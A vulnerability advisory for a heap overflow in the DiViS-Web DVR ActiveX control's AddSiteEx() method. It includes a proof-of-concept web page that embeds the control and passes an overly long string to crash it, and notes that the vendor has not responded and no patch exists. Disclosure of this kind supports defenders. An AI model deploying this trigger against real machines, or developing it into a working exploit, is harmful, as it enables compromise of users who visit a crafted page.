Description
***********

DiViS-Web ActiveX (ActiveView.cab) has Heap Overflow vulnerability.



Details
*******

Heap overflow vulnerability found in AddSiteEx() function.

There is an exploitable heap overflow vulnerability in DVR's ActiveX
control (ActiveView.cab).

If an DVR user were to visit a malicious web page, the overflow could be triggered allowing for a "remote" compromise of the user's machine. Alternatively, an attacker could send their target a specially crafted e-mail, loaded with an exploit to take advantage of this vulnerability.

The problem arises by passing an overly long string to the AddSiteEx
method of the control.

PoC:

    <OBJECT ID="DVR" classid="clsid:66F7F252-3FE1-4650-B1E5-94B2A38271C5" STYLE="width: 0px;">
    <PARAM NAME="_Version" VALUE="65536">
    <PARAM NAME="_ExtentX" VALUE="18203">
    <PARAM NAME="_ExtentY" VALUE="13705">
    <PARAM NAME="_StockProps" VALUE="0">
    <PARAM NAME="Split" VALUE="4">
    </OBJECT>

    //server address
    var g_sAddress = location.hostname;
    var g_sId = "";
    var g_sPwd = "";
    var g_bLogin = false;
    var g_nMaxCamera = 16;

    // Port setting
    var g_nImage = 3000;
    var g_nControl = 3001;
    var g_nSound = 8800;

    var long_buff = "alexsint";

    while(long_buff.length<(550*8)) long_buff = long_buff + "alexsint"; //rewrite registers

    DVR.Channels = 1;

    DVR.AddSiteEx("", "", long_buff, "", 0, g_nImage, g_nControl, g_nSound); //Crash on Free() at ntdll



Solution
********

We did not get any response from vendor for more than 2 weeks.

No patches aviable.
